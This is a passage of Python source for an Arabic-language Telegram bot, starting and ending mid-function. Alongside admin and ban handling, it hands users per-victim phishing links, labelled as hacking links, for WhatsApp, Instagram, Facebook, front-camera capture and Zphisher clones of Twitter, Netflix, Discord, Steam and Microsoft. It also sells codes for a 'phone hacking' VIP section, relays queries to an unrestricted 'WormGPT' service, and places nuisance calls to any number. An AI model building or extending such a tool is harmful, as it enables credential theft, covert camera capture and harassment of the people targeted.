            elif user_id in ADMIN_IDS and not is_owner(chat_id):
                bot.send_message(chat_id, "❌ لا يمكن حظر أدمن آخر")
            else:
                banned = load_banned_users()
                if user_id not in banned:
                    banned.append(user_id)
                    save_banned_users(banned)
                    bot.send_message(chat_id, f"✅ تم حظر العضو `{user_id}` بنجاح", parse_mode="Markdown")
                    try:
                        bot.send_message(user_id, "🚫 **لقد تم حظرك من استخدام هذا البوت**")
                    except:
                        pass
                else:
                    bot.send_message(chat_id, f"⚠️ العضو `{user_id}` محظور بالفعل", parse_mode="Markdown")
        except ValueError:
            bot.send_message(chat_id, "❌ الرجاء إدخال آيدي رقمي صحيح")
        
        waiting_for_ban_user[chat_id] = False
        return
    
    # معالجة فك حظر
    if waiting_for_unban_user.get(chat_id):
        if not is_admin(chat_id):
            bot.send_message(chat_id, "❌ عذراً، أنت لست أدمن في هذا البوت")
            waiting_for_unban_user[chat_id] = False
            return
        
        user_input = message.text.strip()
        try:
            user_id = int(user_input)
            banned = load_banned_users()
            if user_id in banned:
                banned.remove(user_id)
                save_banned_users(banned)
                bot.send_message(chat_id, f"✅ تم فك حظر العضو `{user_id}` بنجاح", parse_mode="Markdown")
            else:
                bot.send_message(chat_id, f"⚠️ العضو `{user_id}` غير موجود في قائمة المحظورين", parse_mode="Markdown")
        except ValueError:
            bot.send_message(chat_id, "❌ الرجاء إدخال آيدي رقمي صحيح")
        
        waiting_for_unban_user[chat_id] = False
        return

    # التحقق من الاشتراك الإجباري للمستخدمين العاديين
    if not is_admin(chat_id):
        if not check_subscription_and_continue(chat_id, chat_id):
            return

    # معلومات IP
    if waiting_for_ip.get(chat_id):
        ip = message.text.strip()
        try:
            r = requests.get(
                f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,query,isp,org,as,timezone,zip,lat,lon",
                timeout=8
            ).json()
            if r.get("status") == "success":
                bot.send_message(chat_id,
                    f"🌐 **معلومات IP:**\n\n"
                    f"📍 **IP:** `{r.get('query')}`\n"
                    f"🏳️ **الدولة:** {r.get('country')}\n"
                    f"🏙️ **المدينة:** {r.get('city')}\n"
                    f"📡 **ISP:** {r.get('isp')}\n"
                    f"🏢 **المنظمة:** {r.get('org')}\n"
                    f"🔢 **AS:** {r.get('as')}\n"
                    f"🌍 **المنطقة:** {r.get('regionName')}\n"
                    f"🕒 **المنطقة الزمنية:** {r.get('timezone')}\n"
                    f"📮 **الرمز البريدي:** {r.get('zip')}\n"
                    f"📍 **خط الطول:** {r.get('lon')}\n"
                    f"📍 **خط العرض:** {r.get('lat')}",
                    parse_mode="Markdown"
                )
            else:
                bot.send_message(chat_id, "❌ لم يتم العثور على معلومات لهذا IP")
        except Exception as e:
            bot.send_message(chat_id, f"⚠️ خطأ: {e}")
        waiting_for_ip[chat_id] = False
        return

    # بحث مستخدم
    if waiting_for_user_lookup.get(chat_id):
        user_input = message.text.strip()
        try:
            user_id = int(user_input)
        except ValueError:
            bot.send_message(chat_id, "❌ الرجاء إدخال رقم معرف (ID) صحيح")
            waiting_for_user_lookup[chat_id] = False
            return

        try:
            target = bot.get_chat(user_id)
            first = getattr(target, "first_name", "") or ""
            last = getattr(target, "last_name", "") or ""
            fullname = (first + " " + last).strip() or "غير متوفر"
            username = getattr(target, "username", None)
            profile_msg = f"👤 **الاسم:** {fullname}\n"
            profile_msg += f"🔗 **اليوزر:** @{username}" if username else "🔗 **اليوزر:** لا يوجد"

            markup = InlineKeyboardMarkup()
            if username:
                markup.add(InlineKeyboardButton("عرض الحساب", url=f"https://t.me/{username}"))
            else:
                markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
            bot.send_message(chat_id, profile_msg, reply_markup=markup, parse_mode="Markdown")

        except Exception as e:
            bot.send_message(chat_id, f"❌ خطأ: {e}")
        waiting_for_user_lookup[chat_id] = False
        return

    # اختصار رابط
    if waiting_for_link_short.get(chat_id):
        url = message.text.strip()
        if not url.startswith("http"):
            bot.send_message(chat_id, "⚠️ ارسل رابط كامل يبدأ بـ http/https")
        else:
            res = hide_link_service(url)
            bot.send_message(chat_id, f"✅ **الرابط المختصر:**\n`{res}`", parse_mode="Markdown")
        waiting_for_link_short[chat_id] = False
        return

    # ترجمة
    if waiting_for_translate.get(chat_id):
        text_to_translate = message.text.strip()
        try:
            translated_text = GoogleTranslator(source='auto', target='ar').translate(text_to_translate)
            bot.send_message(chat_id, f"🌐 **الترجمة:**\n📝 **النص المترجم:** {translated_text}", parse_mode="Markdown")
        except Exception as e:
            bot.send_message(chat_id, f"⚠️ خطأ: {e}")
        waiting_for_translate[chat_id] = False
        return

    # WormGPT
    if waiting_for_wormgpt.get(chat_id):
        waiting_for_wormgpt[chat_id] = False
        user_msg = message.text.strip()
        try:
            bot.send_chat_action(chat_id, 'typing')
            import urllib.parse
            encoded_q = urllib.parse.quote(user_msg)
            api_url = f"https://elmodmen-worm.vercel.app/chat?q={encoded_q}"
            resp = requests.get(api_url, timeout=30)
            data = resp.json()
            if data.get("status") == "success":
                reply = data.get("reply", "❌ لا يوجد رد")
                try:
                    translated = GoogleTranslator(source='auto', target='ar').translate(reply)
                except:
                    translated = reply
                bot.send_message(chat_id, f"🐛 **WormGPT:**\n\n{translated}", parse_mode="Markdown")
            else:
                bot.send_message(chat_id, "❌ حصل خطأ في الـ API، حاول تاني.")
        except Exception as e:
            bot.send_message(chat_id, f"❌ خطأ: {e}")
        return

    # صور AI
    if waiting_for_ai_image.get(chat_id):
        waiting_for_ai_image[chat_id] = False
        prompt = message.text.strip()
        try:
            bot.send_chat_action(chat_id, 'upload_photo')
            bot.send_message(chat_id, "🎨 جاري إنشاء الصورة...")
            resp = requests.post("https://zecora0.serv00.net/ai/NanoBanana.php", data={
                "text": prompt,
                "ratio": "16:9",
                "res": "4K"
            }, timeout=60)
            data = resp.json()
            if data.get("success"):
                img_url = data.get("url", "")
                if img_url:
                    img_data = requests.get(img_url, timeout=30).content
                    bot.send_photo(chat_id, img_data, caption=f"🎨 **{prompt}**", parse_mode="Markdown")
                else:
                    bot.send_message(chat_id, "❌ لم يتم إنشاء الصورة.")
            else:
                bot.send_message(chat_id, "❌ حصل خطأ في إنشاء الصورة.")
        except Exception as e:
            bot.send_message(chat_id, f"❌ خطأ: {e}")
        return

    # اتصال وهمي
    if waiting_for_virtual_call.get(chat_id):
        waiting_for_virtual_call[chat_id] = False
        phone = message.text.strip()
        if not phone or len(phone) < 5:
            bot.send_message(chat_id, "❌ أرسل رقم هاتف صحيح بالصيغة الدولية.\nمثال: `+201012345678`", parse_mode="Markdown")
            return
        try:
            bot.send_chat_action(chat_id, 'typing')
            import hashlib, time
            fgp = str(int(time.time() * 1000))
            fgp2 = hashlib.md5((phone + fgp).encode()).hexdigest()
            resp = requests.post("https://callmyphone.org/do-call", data={
                "phone": phone,
                "browser": "{}",
                "fgp": fgp,
                "fgp2": fgp2,
                "rememberNumber": "1",
                "recaptcha": ""
            }, timeout=15)
            data = resp.json()
            if data.get("errorCode") == "success":
                bot.send_message(chat_id, f"✅ **تم بنجاح!**\n\n📞 الرقم `{phone}` يجب أن يرن الآن.", parse_mode="Markdown")
            elif data.get("free_personal_call_limit_exceed"):
                bot.send_message(chat_id, "⚠️ تم تجاوز الحد اليومي (4 مرات/يوم).\n\n🔗 افتح الموقع:")
                markup = InlineKeyboardMarkup()
                markup.add(InlineKeyboardButton("🔗 فتح الموقع", url=f"https://callmyphone.org/#phone={phone}"))
                bot.send_message(chat_id, "🌐 اضغط للفتح:", reply_markup=markup)
            elif data.get("phone_number_is_blocked"):
                bot.send_message(chat_id, "❌ هذا الرقم محظور.")
            elif data.get("invalid_phone_number"):
                markup = InlineKeyboardMarkup()
                markup.add(InlineKeyboardButton("📞 اتصل بالرقم من الموقع", url=f"https://callmyphone.org/#phone={phone}"))
                bot.send_message(chat_id, f"📞 الرقم `{phone}`\n\n🔗 اضغط الزر الأسفل لتنفيذ الاتصال من الموقع:", reply_markup=markup, parse_mode="Markdown")
            else:
                markup = InlineKeyboardMarkup()
                markup.add(InlineKeyboardButton("📞 اتصل بالرقم من الموقع", url=f"https://callmyphone.org/#phone={phone}"))
                bot.send_message(chat_id, f"📞 الرقم `{phone}`\n\n🔗 اضغط الزر الأسفل لتنفيذ الاتصال:", reply_markup=markup, parse_mode="Markdown")
        except Exception as e:
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("📞 اتصل بالرقم من الموقع", url=f"https://callmyphone.org/#phone={phone}"))
            bot.send_message(chat_id, f"📞 الرقم `{phone}`\n\n🔗 اضغط الزر الأسفل لتنفيذ الاتصال:", reply_markup=markup, parse_mode="Markdown")
        return

    # إضافة قسم جديد - اسم القسم
    if waiting_for_admin_new_section_name.get(chat_id):
        waiting_for_admin_new_section_name[chat_id] = False
        section_name = message.text.strip()
        import hashlib
        section_id = hashlib.md5(section_name.encode()).hexdigest()[:8]
        data = load_sections()
        data.setdefault("sections", []).append({
            "id": section_id,
            "name": section_name,
            "files": []
        })
        save_sections(data)
        bot.send_message(chat_id, f"✅ تم إضافة القسم: **{section_name}**\n\n📎 أرسل ملفاً واحداً أو أكثر لإضافته للقسم:", parse_mode="Markdown")
        waiting_for_admin_section_file[chat_id] = True
        admin_section_file_pending[chat_id] = section_id
        return

    # إنشاء كود VIP - الخطوة 1: اسم الكود
    if waiting_for_admin_vip_code.get(chat_id):
        waiting_for_admin_vip_code[chat_id] = False
        code_text = message.text.strip()
        if not code_text:
            bot.send_message(chat_id, "❌ أرسل كود غير فارغ.")
            return
        waiting_for_admin_vip_limit[chat_id] = code_text
        bot.send_message(chat_id, f"✅ الكود: `{code_text}`\n\n📊 أرسل عدد الأشخاص المسموح استخدام الكود:", parse_mode="Markdown")
        return

    # إنشاء كود VIP - الخطوة 2: عدد الاستخدام
    if waiting_for_admin_vip_limit.get(chat_id):
        code_text = waiting_for_admin_vip_limit[chat_id]
        waiting_for_admin_vip_limit[chat_id] = False
        try:
            limit = int(message.text.strip())
            if limit < 1:
                bot.send_message(chat_id, "❌ أرسل رقم أكبر من 0.")
                return
        except ValueError:
            bot.send_message(chat_id, "❌ أرسل رقم صحيح.")
            return
        data = load_vip_codes()
        data.setdefault("phone_hack", {})[code_text] = {"limit": limit, "used": 0}
        save_vip_codes(data)
        bot.send_message(chat_id, f"🔑 **تم إنشاء الكود بنجاح!**\n\n📦 الكود: `{code_text}`\n👥 عدد الاستخدام: {limit}\n\nالان يمكنك استخدام الكود وإرساله لاي عرص 🧑‍💻😁", parse_mode="Markdown")
        return

    # إنشاء كود انشاء بوت - الخطوة 1
    if waiting_for_admin_clone_code.get(chat_id):
        waiting_for_admin_clone_code[chat_id] = False
        code_text = message.text.strip()
        if not code_text:
            bot.send_message(chat_id, "❌ أرسل كود غير فارغ.")
            return
        waiting_for_admin_clone_limit[chat_id] = code_text
        bot.send_message(chat_id, f"✅ الكود: `{code_text}`\n\n📊 أرسل عدد الأشخاص المسموح استخدام الكود:", parse_mode="Markdown")
        return

    # إنشاء كود انشاء بوت - الخطوة 2
    if waiting_for_admin_clone_limit.get(chat_id):
        code_text = waiting_for_admin_clone_limit[chat_id]
        waiting_for_admin_clone_limit[chat_id] = False
        try:
            limit = int(message.text.strip())
            if limit < 1:
                bot.send_message(chat_id, "❌ أرسل رقم أكبر من 0.")
                return
        except ValueError:
            bot.send_message(chat_id, "❌ أرسل رقم صحيح.")
            return
        data = load_vip_codes()
        data.setdefault("clone_bot", {})[code_text] = {"limit": limit, "used": 0}
        save_vip_codes(data)
        bot.send_message(chat_id, f"🤖 **تم إنشاء كود البوت بنجاح!**\n\n📦 الكود: `{code_text}`\n👥 عدد الاستخدام: {limit}", parse_mode="Markdown")
        return

    # إدخال كود VIP من المستخدم
    if waiting_for_user_vip_code.get(chat_id):
        waiting_for_user_vip_code[chat_id] = False
        code_text = message.text.strip()
        if check_vip_code(code_text, "phone_hack"):
            send_admin_notification(f"👤 المستخدم `{chat_id}` فتح قسم اختراق الهاتف بالكود: `{code_text}`")
            bot.send_message(chat_id, f"✅ **تم التحقق بنجاح!**\n\nمرحباً بك في قسم اختراق الهاتف VIP 🔓", parse_mode="Markdown")
            data = load_sections()
            for sec in data.get("sections", []):
                if sec["id"] == "phone_hack":
                    bot.send_message(chat_id, f"📱 **{sec['name']}**\n\n🔗 ادخل القناة وحمّل الملفات:\n\nhttps://t.me/+hD7PO6QAOv00Zjdk\n\nمقدمه من عمك المدمن 🫶💔", parse_mode="Markdown")
                    break
            markup = build_phone_hack_vip_menu()
            bot.send_message(chat_id, "📱 **الاقسام المتاحة:**", reply_markup=markup, parse_mode="Markdown")
        else:
            bot.send_message(chat_id, "❌ الكود غير صحيح أو اكتمل عدد الاستخدام.\n\nتواصل مع الأدمن للحصول على كود جديد.")
        return

    # إدخال كود انشاء بوت
    if waiting_for_user_clone_code.get(chat_id):
        waiting_for_user_clone_code[chat_id] = False
        code_text = message.text.strip()
        if check_vip_code(code_text, "clone_bot"):
            send_admin_notification(f"👤 المستخدم `{chat_id}` فتح ميزة إنشاء بوت مشابه بالكود: `{code_text}`")
            bot.send_message(chat_id, "✅ **تم التحقق بنجاح!**\n\n🤖 **إنشاء بوت مشابه**\n\nهذه الميزة تسمح لك بإنشاء بوت خاص بك يحتوي على جميع ميزات البوت الأساسي.\n\n📦 **التفاصيل:**\n- بوت خاص بك يعمل بشكل مستقل\n- جميع الميزات متاحة لك\n- الأدمن الأساسي وأنت كلاكما أدمن\n\n🔧 أرسل توكن البوت الخاص بك (من @BotFather):", parse_mode="Markdown")
            waiting_for_user_clone_token[chat_id] = True
        else:
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔄 إعادة المحاولة", callback_data="clone_bot_retry", style="primary"))
            markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main", style="danger"))
            bot.send_message(chat_id, "❌ الكود غير صحيح أو اكتمل عدد الاستخدام.", reply_markup=markup)
        return

    # استقبال توكن البوت
    if waiting_for_user_clone_token.get(chat_id):
        waiting_for_user_clone_token[chat_id] = False
        token = message.text.strip()
        if ":" not in token:
            bot.send_message(chat_id, "❌ توكن غير صحيح. تأكد أنه من @BotFather")
            return
        try:
            test_bot = telebot.TeleBot(token)
            me = test_bot.get_me()
            if not me:
                bot.send_message(chat_id, "❌ توكن غير صحيح.")
                return
            bot_username = me.username
            bot.send_message(chat_id, f"✅ **تم التحقق من البوت!**\n\n🤖 اسم البوت: @{bot_username}\n\n📝 أرسل الآن ايدي الأدمن الثاني (المستخدم):", parse_mode="Markdown")
            waiting_for_user_clone_adminid[chat_id] = {"token": token, "bot_username": bot_username}
        except Exception as e:
            bot.send_message(chat_id, f"❌ خطأ في التحقق من التوكن: {e}")
        return

    # استقبال ايدي الأدمن
    if waiting_for_user_clone_adminid.get(chat_id):
        info = waiting_for_user_clone_adminid[chat_id]
        waiting_for_user_clone_adminid[chat_id] = False
        try:
            user_admin_id = int(message.text.strip())
        except ValueError:
            bot.send_message(chat_id, "❌ أرسل ايدي رقمي صحيح.")
            return
        token = info["token"]
        bot_username = info["bot_username"]
        data = load_vip_codes()
        data.setdefault("created_bots", []).append({
            "token": token,
            "bot_username": bot_username,
            "owner": chat_id,
            "admin": user_admin_id,
            "owner_main_admin": OWNER_ID
        })
        save_vip_codes(data)
        success_msg = (
            f"🤖 **تم إنشاء البوت بنجاح!**\n\n"
            f"📦 اسم البوت: @{bot_username}\n"
            f"👤 المالك: `{chat_id}`\n"
            f"🔑 التوكن: `{token}`\n\n"
            f"✅ الأدمن الأساسي: `{OWNER_ID}`\n"
            f"✅ الأدمن المستخدم: `{user_admin_id}`\n\n"
            f"🔗 افتح البوت: https://t.me/{bot_username}"
        )
        bot.send_message(chat_id, success_msg, parse_mode="Markdown")
        send_admin_notification(
            f"🤖 **بوت جديد تم إنشاؤه!**\n\n"
            f"📦 البوت: @{bot_username}\n"
            f"👤 المالك: `{chat_id}`\n"
            f"🔗 https://t.me/{bot_username}"
        )
        return

    # فحص سيرفر
    if waiting_for_server_check.get(chat_id):
        url = message.text.strip()
        if not url.startswith("http"):
            url = "http://" + url
        try:
            loading_msg = bot.send_message(chat_id, "🌐 **جاري فحص السيرفر...**")
            hostname = url.split("//")[-1].split("/")[0]
            ip = socket.gethostbyname(hostname)
            r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,query,isp,org,as,lat,lon", timeout=8).json()
            if r.get("status") == "success":
                bot.edit_message_text(
                    f"🌐 **معلومات السيرفر:**\n\n"
                    f"📍 **IP:** `{r.get('query')}`\n"
                    f"🏳️ **الدولة:** {r.get('country')}\n"
                    f"🏙️ **المدينة:** {r.get('city')}\n"
                    f"📡 **ISP:** {r.get('isp')}\n"
                    f"🏢 **المنظمة:** {r.get('org')}\n"
                    f"🔢 **AS:** {r.get('as')}",
                    chat_id,
                    loading_msg.message_id,
                    parse_mode="Markdown"
                )
            else:
                bot.edit_message_text("❌ لم يتم العثور على معلومات", chat_id, loading_msg.message_id)
        except Exception as e:
            bot.edit_message_text(f"⚠️ خطأ: {e}", chat_id, loading_msg.message_id)
        waiting_for_server_check[chat_id] = False
        return

# ===== التعامل مع Callbacks =====
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.from_user.id
    message_id = call.message.message_id
    if is_banned(chat_id):
        bot.answer_callback_query(call.id, "🚫 أنت محظور من استخدام البوت", show_alert=True)
        return
    
    if not is_admin(chat_id):
        subscribed, not_subscribed = check_channel_subscription(chat_id)
        if not subscribed:
            bot.answer_callback_query(call.id, "🔒 يجب الاشتراك في القنوات أولاً", show_alert=True)
            text = "🔒 **عذراً، يجب الاشتراك في القنوات التالية لاستخدام البوت:**\n\n"
            keyboard = InlineKeyboardMarkup(row_width=1)
            
            for channel in not_subscribed:
                try:
                    chat = bot.get_chat(channel)
                    if chat.username:
                        link = f"https://t.me/{chat.username}"
                    else:
                        link = f"https://t.me/{channel.replace('@', '')}"
                except:
                    link = f"https://t.me/{channel.replace('@', '')}"
                
                text += f"🔹 {channel}\n"
                keyboard.add(InlineKeyboardButton(f"الاشتراك في {channel}", url=link))
            
            text += "\n✅ **بعد الاشتراك، اضغط على /start مرة أخرى**"
            
            try:
                bot.edit_message_text(text, chat_id, message_id, reply_markup=keyboard, parse_mode="Markdown")
            except:
                bot.send_message(chat_id, text, reply_markup=keyboard, parse_mode="Markdown")
            return

    # روابط الاختراق
    if call.data == "get_link_num": 
        bot.send_message(chat_id, f"{LINK_NUM}?id={chat_id}")
    elif call.data == "get_link_camera_front": 
        bot.send_message(chat_id, f"{LINK_CAMERA_FRONT}?id={chat_id}")
    elif call.data == "get_tiktok": 
        bot.send_message(chat_id, f"{LINK_TIKTOK}?id={chat_id}")
    elif call.data == "fi_reply": 
        bot.send_message(chat_id, f"{LINK_FI_REPLY}?id={chat_id}")
    elif call.data == "get_kwai": 
        bot.send_message(chat_id, f"{LINK_KWAI}?id={chat_id}")
    elif call.data == "get_voice": 
        bot.send_message(chat_id, f"{LINK_VOICE}?id={chat_id}")
    elif call.data == "get_video": 
        bot.send_message(chat_id, f"{LINK_VIDEO}?id={chat_id}")
    elif call.data == "get_whatsapp": 
        bot.send_message(chat_id, f"{LINK_WHATSAPP}?id={chat_id}")
    elif call.data == "get_instagram": 
        bot.send_message(chat_id, f"{LINK_INSTAGRAM}?id={chat_id}")
    elif call.data == "get_facebook": 
        bot.send_message(chat_id, f"{LINK_FACEBOOK}?id={chat_id}")
    elif call.data == "get_pubg": 
        bot.send_message(chat_id, f"{LINK_PUBG}?id={chat_id}")
    elif call.data == "get_freefire": 
        bot.send_message(chat_id, f"{LINK_FREEFIRE}?id={chat_id}")
    elif call.data == "get_snapchat": 
        bot.send_message(chat_id, f"{LINK_SNAPCHAT}?id={chat_id}")
    elif call.data == "get_youtube": 
        bot.send_message(chat_id, f"{LINK_YOUTUBE}?id={chat_id}")
    elif call.data == "get_google": 
        bot.send_message(chat_id, f"{LINK_GOOGLE}?id={chat_id}")
    elif call.data == "get_messenger": 
        bot.send_message(chat_id, f"{LINK_MESSENGER}?id={chat_id}")

    # خدمات عامة
    elif call.data == "get_id":
        bot.send_message(chat_id, f"🆔 ايديك: `{chat_id}`")
    
    elif call.data == "ai_image":
        waiting_for_ai_image[chat_id] = True
        bot.send_message(chat_id, "🎨 **صور AI - NanoBanana**\n\n📝 أرسل وصف الصورة التي تريد إنشاءها:\n\nمثال: مدينة مستقبلية مع أضواء نيون", parse_mode="Markdown")
    
    elif call.data == "short_link":
        waiting_for_link_short[chat_id] = True
        bot.send_message(chat_id, "🔗 أرسل الرابط الذي تريد اختصاره:")

    elif call.data == "virtual_call":
        waiting_for_virtual_call[chat_id] = True
        bot.send_message(chat_id, "☎️ **اتصال وهمي**\n\n📱 أرسل الرقم الذي تريد الاتصال به (بالصيغة الدولية):\nمثال: `+201234567890`", parse_mode="Markdown")

    elif call.data == "server_check":
        waiting_for_server_check[chat_id] = True
        bot.send_message(chat_id, "🌐 أرسل رابط السيرفر أو الدومين الذي تريد فحصه:")

    elif call.data == "get_ip_info":
        waiting_for_ip[chat_id] = True
        bot.send_message(chat_id, "🌐 أرسل عنوان IP الذي تريد معرفة معلوماته:")

    elif call.data == "worm_gpt":
        waiting_for_wormgpt[chat_id] = True
        msg = "🐛 **WormGPT - الذكاء الاصطناعي بدون قيود**\n\n"
        msg += "━━━━━━━━━━━━━━━━━\n"
        msg += "💬 أرسل أي سؤال أو رسالة وسأرد عليك فوراً!\n\n"
        msg += "🔴 مثال: كيف أصنع برمجية؟\n"
        msg += "━━━━━━━━━━━━━━━━━\n"
        msg += "⚡Powered by 𝐘𝐄𝐇𝐘𝐀"
        bot.send_message(chat_id, msg, parse_mode="Markdown")

    # ===== لوحة تحكم الأدمن (معالجة Callbacks) =====
    elif call.data == "add_force_channel":
        if not is_admin(chat_id):
            bot.answer_callback_query(call.id, "❌ لست أدمن", show_alert=True)
            return
        waiting_for_add_channel[chat_id] = True
        bot.send_message(chat_id, "📢 أرسل معرف القناة (مثال: @channel)")

    elif call.data == "remove_force_channel":
        if not is_admin(chat_id):
            bot.answer_callback_query(call.id, "❌ لست أدمن", show_alert=True)
            return
        channels = load_channels()
        if not channels:
            bot.send_message(chat_id, "❌ لا توجد قنوات مضغوطة للإزالة")
            return
        waiting_for_remove_channel[chat_id] = True
        bot.send_message(chat_id, "📢 أرسل معرف القناة التي تريد إزالتها")

    elif call.data == "ban_user":
        if not is_admin(chat_id):
            bot.answer_callback_query(call.id, "❌ لست أدمن", show_alert=True)
            return
        waiting_for_ban_user[chat_id] = True
        bot.send_message(chat_id, "🚫 أرسل آيدي العضو الذي تريد حظره:")

    elif call.data == "unban_user":
        if not is_admin(chat_id):
            bot.answer_callback_query(call.id, "❌ لست أدمن", show_alert=True)
            return
        waiting_for_unban_user[chat_id] = True
        bot.send_message(chat_id, "✅ أرسل آيدي العضو الذي تريد فك حظره:")

    elif call.data == "users_count":
        bot.send_message(chat_id, f"📊 عدد المستخدمين الكلي: `{get_users_count()}`", parse_mode="Markdown")

    elif call.data == "admin_vip_tools":
        if not is_admin(chat_id):
            bot.answer_callback_query(call.id, "❌ لست أدمن", show_alert=True)
            return
        waiting_for_admin_new_section_name.pop(chat_id, None)
        waiting_for_admin_section_file.pop(chat_id, None)
        admin_section_file_pending.pop(chat_id, None)
        markup = build_admin_vip_tools_menu()
        try:
            bot.edit_message_text("📱 **أدوات VIP - إدارة الأقسام**\n\nاختر قسم أو أضف قسم جديد:", chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
        except:
            bot.send_message(chat_id, "📱 **أدوات VIP - إدارة الأقسام**\n\nاختر قسم أو أضف قسم جديد:", reply_markup=markup, parse_mode="Markdown")

    elif call.data == "admin_add_section":
        if not is_admin(chat_id):
            bot.answer_callback_query(call.id, "❌ لست أدمن", show_alert=True)
            return
        waiting_for_admin_new_section_name[chat_id] = True
        bot.send_message(chat_id, "📝 أرسل اسم القسم الجديد:")

    elif call.data.startswith("admin_vip_section_"):
        if not is_admin(chat_id):
            bot.answer_callback_query(call.id, "❌ لست أدمن", show_alert=True)
            return
        section_id = call.data.replace("admin_vip_section_", "")
        data = load_sections()
        for sec in data.get("sections", []):
            if sec["id"] == section_id:
                files_text = ""
                for i, f in enumerate(sec.get("files", [])):
                    files_text += f"  {i+1}. {f['label']}\n"
                if not files_text:
                    files_text = "  لا توجد ملفات بعد.\n"
                msg = f"📱 **{sec['name']}**\n\n📂 الملفات:\n{files_text}"
                markup = build_admin_section_detail_menu(section_id)
                try:
                    bot.edit_message_text(msg, chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
                except:
                    bot.send_message(chat_id, msg, reply_markup=markup, parse_mode="Markdown")
                break

    elif call.data.startswith("admin_add_file_to_"):
        if not is_admin(chat_id):
            bot.answer_callback_query(call.id, "❌ لست أدمن", show_alert=True)
            return
        section_id = call.data.replace("admin_add_file_to_", "")
        waiting_for_admin_section_file[chat_id] = True
        admin_section_file_pending[chat_id] = section_id
        bot.send_message(chat_id, "📎 أرسل الملف الآن:")

    elif call.data.startswith("admin_del_section_"):
        if not is_admin(chat_id):
            bot.answer_callback_query(call.id, "❌ لست أدمن", show_alert=True)
            return
        section_id = call.data.replace("admin_del_section_", "")
        data = load_sections()
        data["sections"] = [s for s in data.get("sections", []) if s["id"] != section_id]
        save_sections(data)
        markup = build_admin_vip_tools_menu()
        try:
            bot.edit_message_text("✅ تم حذف القسم.\n\n📱 **أدوات VIP**", chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
        except:
            bot.send_message(chat_id, "✅ تم حذف القسم.", reply_markup=markup, parse_mode="Markdown")

    elif call.data.startswith("admin_ph_file_"):
        if not is_admin(chat_id):
            bot.answer_callback_query(call.id, "❌ لست أدمن", show_alert=True)
            return
        parts = call.data.replace("admin_ph_file_", "").split("_", 1)
        section_id = parts[0]
        file_index = int(parts[1])
        data = load_sections()
        for sec in data.get("sections", []):
            if sec["id"] == section_id:
                files = sec.get("files", [])
                if 0 <= file_index < len(files):
                    f = files[file_index]
                    markup = InlineKeyboardMarkup(row_width=1)
                    markup.add(InlineKeyboardButton("🗑 حذف الملف", callback_data=f"admin_del_file_{section_id}_{file_index}", style="danger"))
                    markup.add(InlineKeyboardButton("🔙 رجوع", callback_data=f"admin_vip_section_{section_id}", style="primary"))
                    try:
                        bot.edit_message_text(f"📁 **{f['label']}**\n\n📦 القسم: {sec['name']}\n📄 الملف: `{f.get('file_name', '?')}`", chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
                    except:
                        bot.send_message(chat_id, f"📁 **{f['label']}**\n\n📦 القسم: {sec['name']}\n📄 الملف: `{f.get('file_name', '?')}`", reply_markup=markup, parse_mode="Markdown")
                break

    elif call.data.startswith("admin_del_file_"):
        if not is_admin(chat_id):
            bot.answer_callback_query(call.id, "❌ لست أدمن", show_alert=True)
            return
        parts = call.data.replace("admin_del_file_", "").split("_", 1)
        section_id = parts[0]
        file_index = int(parts[1])
        data = load_sections()
        for sec in data.get("sections", []):
            if sec["id"] == section_id:
                files = sec.get("files", [])
                if 0 <= file_index < len(files):
                    removed = files.pop(file_index)
                    save_sections(data)
                    bot.answer_callback_query(call.id, f"✅ تم حذف {removed.get('label', '?')}")
                break
        markup = build_admin_section_detail_menu(section_id)
        try:
            bot.edit_message_reply_markup(chat_id, message_id, reply_markup=markup)
        except:
            pass

    elif call.data.startswith("admin_upload_"):
        if not is_admin(chat_id):
            bot.answer_callback_query(call.id, "❌ لست أدمن", show_alert=True)
            return
        parts = call.data.replace("admin_upload_", "").split("__", 1)
        section_id = parts[0]
        slot = parts[1]
        slot_label = PHONE_HACK_SLOTS.get(slot, slot)
        waiting_for_admin_section_file[chat_id] = True
        admin_section_file_pending[chat_id] = f"{section_id}__{slot}"
        bot.send_message(chat_id, f"📎 أرسل ملف **{slot_label}**:", parse_mode="Markdown")

    elif call.data == "social_media_menu":
        markup = build_social_menu()
        try:
            bot.delete_message(chat_id, message_id)
        except:
            pass
        try:
            bot.send_photo(chat_id, WELCOME_IMAGE, caption="🔥 **قسم اختراق السوشل ميديا**\nاختر التطبيق الذي تريد:", reply_markup=markup)
        except:
            bot.send_message(chat_id, "🔥 **قسم اختراق السوشل ميديا**\nاختر التطبيق الذي تريد:", reply_markup=markup, parse_mode="Markdown")

    # ===== صفحات اختراق السوشل ميديا من Zphisher =====
    elif call.data == "get_twitter":
        bot.send_message(chat_id, f"{VERCEL_BASE}/X.html?id={chat_id}")
    elif call.data == "get_netflix":
        bot.send_message(chat_id, f"{VERCEL_BASE}/NetFlex.html?id={chat_id}")
    elif call.data == "get_discord":
        bot.send_message(chat_id, f"{VERCEL_BASE}/Discord.html?id={chat_id}")
    elif call.data == "get_roblox":
        bot.send_message(chat_id, f"{VERCEL_BASE}/Roblox.html?id={chat_id}")
    elif call.data == "get_linkedin":
        bot.send_message(chat_id, f"{VERCEL_BASE}/Linkedn.html?id={chat_id}")
    elif call.data == "get_spotify":
        bot.send_message(chat_id, f"{VERCEL_BASE}/Spotify.html?id={chat_id}")
    elif call.data == "get_twitch":
        bot.send_message(chat_id, f"{VERCEL_BASE}/Twetch.html?id={chat_id}")
    elif call.data == "get_steam":
        bot.send_message(chat_id, f"{VERCEL_BASE}/Steam.html?id={chat_id}")
    elif call.data == "get_microsoft":
        bot.send_message(chat_id, f"{VERCEL_BASE}/MicroSoft.html?id={chat_id}")
    elif call.data == "get_yahoo":
        bot.send_message(chat_id, f"{VERCEL_BASE}/Yahoo.html?id={chat_id}")

    elif call.data == "back_to_main":
        markup = build_main_menu()
        try:
            bot.delete_message(chat_id, message_id)
        except:
            pass
        try:
            bot.send_photo(chat_id, WELCOME_IMAGE, caption=WELCOME_MSG, reply_markup=markup)
